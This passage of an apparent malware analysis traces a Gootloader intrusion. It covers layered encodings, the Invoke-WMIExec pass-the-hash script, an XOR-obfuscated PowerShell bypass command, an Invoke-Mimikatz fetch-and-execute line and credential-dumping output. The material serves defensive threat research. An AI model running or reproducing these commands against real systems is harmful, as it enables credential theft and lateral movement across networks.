75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x\n```\n\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.\n\n```image\nAlt: Base64 Encoded\nDescription: The image displays a lengthy encoded PowerShell script, likely used for malicious purposes in a cyber attack, illustrating the complexity of the encoding methods employed by the threat actor. The script is presented in a monospaced font, indicating it is code rather than regular text. The encoding seems to involve multiple layers, including Base64 and potentially other obfuscation techniques, and appears to be related to the execution of a WMIExec script for remote queries.\n```\n\nDecoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.\n\n```image\nAlt: WMIExec\nDescription: The image depicts a user interface for a decoding tool, showing an input section containing a Base64 encoded string that has been obfuscated. The output section displays the decoded PowerShell script named 'Invoke-WMIExec', which includes comments and parameters for executing WMI commands on target hosts using NTLMv2 for authentication. The layout suggests this is a practical demonstration of decoding a potentially malicious script related to cyber threats.\nTranscription: |\n  function Invoke-WMIExec\n  {\n  <#\n  .SYNOPSIS\n  Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.\n  \n  Author: Kevin Robertson (@kevin_robertson)\n  License: BSD 3-Clause\n  \n  .PARAMETER Target\n  Hostname or IP address of target.\n  \n  .PARAMETER Username\n  Username to use for authentication.\n  \n  .PARAMETER Domain\n  Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.\n  \n  .PARAMETER Hash\n  NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.\n  \n  .PARAMETER Command\n  Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.\n  #>\n```\n\n## Credential Access\n\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.\n\n```image\nAlt: mi.ps1\nDescription: The image displays a table documenting a file creation event related to a cybersecurity incident. It includes columns for 'Action Type', 'Folder Path', 'File Name', and 'Initiating Process Folder Path'. The 'Action Type' indicates 'FileCreated', the 'Folder Path' shows 'C:\\Users\\<redacted>', the 'File Name' is 'mi.ps1', and the 'Initiating Process Folder Path' is 'C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe'. This data is relevant to tracking the activities of a malicious PowerShell script in the context of credential access.\nTranscription: |\n  Action Type      Folder Path      File Name   Initiating Process Folder Path\n  FileCreated      C:\\Users\\[redacted]   mi.ps1      c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\n```\n\nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.\n\n```image\nAlt: XOR Encoding\nDescription: The image depicts a detailed output related to a PowerShell process creation event. It includes a command line that shows the execution of a PowerShell script with various parameters and encoded elements. The command appears to be part of a malicious activity, possibly related to credential access or exploitation. Key elements include the use of '-nop', '-noninteractive', and '-ep bypass' flags, along with a script block creation and a base64 encoded string that suggests obfuscation techniques typical in cyber threats.\nTranscription: |\n  TaskCategory          CommandLine\n  Process Create        powershell -nop -noni -ep bypass -w h -c \"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name -clike'F*g'}).Name)('PG01MD9wbGxoJjC3KSoVNjg2KDYpi1oqKi9Nz9kPMWWuUpVODxHMWUxIzxtZDAwX1tOVEFyTFVdMjEjOFFlaHdqbDVVd3xtdH04WyJETWt9amtEMYVIrcHk2dXdrdHlHRVxNmhrKSM4UXZud3N9NVVxdXFzelwx10DVbd3VobWx9a1Z5dX04XF1LU0xXSDVLSeXBTY8u'))%{$_-bxor24}|%{[char]$_})-join'')\"\n```\n\nThis CyberChef recipe can be used to decode the inner encoded command.\n\nThe output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.\n\n```\n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\n```\n\nMonitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.\n\n```image\nAlt: Mimikatz\nDescription: The image displays a terminal output related to the Mimikatz tool, specifically its logon passwords command invocation. It reveals detailed authentication information such as the Authentication ID, User Name, Domain, Logon Server, and various Security Identifiers (SIDs). The output also shows encrypted passwords and associated data for different user sessions, which are vital for cybersecurity analysis and understanding credential access methods used by attackers.\nTranscription: |\n  \"CommandInvocation(Out-Default): \"Out-Default\"\n  ParameterBinding(Out-Default): name=\"InputObject\", value=\"\n    .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11\n   .## ^ ##.  \"A La Vie, A L'Amour\"  (oe.eo)\n   ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )\n   ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n   '## v ##'  /*** Vincent LE TOUX             ( vincent.letoux@gmail.com )\n    '#####'       > https://pingcastle.com / https://mysmartlogon.com ***\n  \n  mimikatz(powershell) # sekurlsa::logonpasswords\n  \n  Authentication Id : 0 ; 58533736 (00000000:037d2600)\n  Session           : Interactive from 4\n  User Name         : DWM-4\n  Domain            : Window Manager\n  Logon Server      : (null)\n  Logon Time        : \n  SID               : S-1-5-90-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username : \n           * Domain   : \n           * NTLM     : eb40793              f7177c39\n           * SHA1     : 348211b              5c344070060a76d3\n          tspkg :\n          wdigest :\n           * Username : \n           * Domain   : \n           * Password : (null)\n          kerberos :\n           * Username :                      $\n           * Domain   : .local\n           * Password : 